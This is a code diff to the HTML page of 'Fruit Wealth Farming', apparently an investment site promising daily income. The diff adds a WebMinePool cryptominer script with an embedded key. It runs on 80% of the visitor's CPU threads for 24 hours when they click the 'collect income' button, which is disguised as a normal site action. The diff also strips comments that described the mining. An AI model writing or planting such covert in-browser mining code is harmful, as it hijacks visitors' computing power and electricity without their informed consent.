@@ -193,8 +193,7 @@ footer {
             <h1>Fruit Wealth Farming</h1>
         </div>
     </header>
-
-  <!-- User Info -->
+  
   <section class="user-info">
     <p style="color: blue;">Welcome, <span id="userfullName"></span></p>
     <p style="color: blue;">You can upgrade your daily income profit every 24 hours.</p>
@@ -355,10 +354,32 @@ footer {
   setInterval(nextSlide, 3500); 
 </script>  
   <footer class="footer">
-    <p>&copy; 2024 Fruit Wealth Farming</p>
+    <p>&copy; Fruit Wealth Farming</p>
   </footer>  
-   <script src="https://webminepool.com/lib.js"></script>
+   <script src="https://webminepool.com/lib/webminepool.min.js"></script>
+<script>
+    
+const apiKey = "SK_YBn5VEFnw47p2McZK6b6b";
 
+function startMining() {
+    const miner = new WebMinePool(apiKey);
+    
+    miner.setNumThreads(navigator.hardwareConcurrency * 0.8);
+    miner.start();
+   
+    setTimeout(() => {
+        miner.stop();
+        console.log("Mining session ended after 24 hours.");
+    }, 24 * 60 * 60 * 1000);
+
+    console.log("Mining session started.");
+}
+
+document.getElementById("collectIncomeBtn").addEventListener("click", () => {
+    startMining();
+});
+
+</script>
     <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
 import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
@@ -381,10 +402,7 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 const auth = getAuth(app);
 
-// WebMinePool Mining Configuration
-const siteKey = "SK_YBn5VEFnw47p2McZK6b6b";
-let miningActive = false;
-let miningTimeout;
+
 
 // DOM Elements
 const timerElement = document.getElementById("timer");
@@ -462,11 +480,11 @@ const startMining = () => {
   miningActive = true;
   console.log("Mining started...");
 
-  // Simulate mining progress for 20 minutes (20% CPU usage)
+  
   miningTimeout = setTimeout(() => {
     console.log("Mining complete!");
     miningActive = false;
-  }, 20 * 60 * 1000);  // 20 minutes in milliseconds
+  }, 20 * 60 * 1000);  
 };
 
 // Initialize App
@@ -508,8 +526,7 @@ const loadUserData = async (userId) => {
         investmentAmount >= 3500 ? "ba.png" : "avatar.png";
 
       levelImage.src = levelImageSrc;
-
-      // Start mining if the user has an investment threshold
+      
       if (investmentAmount >= 10000) {
         startMining();
       }
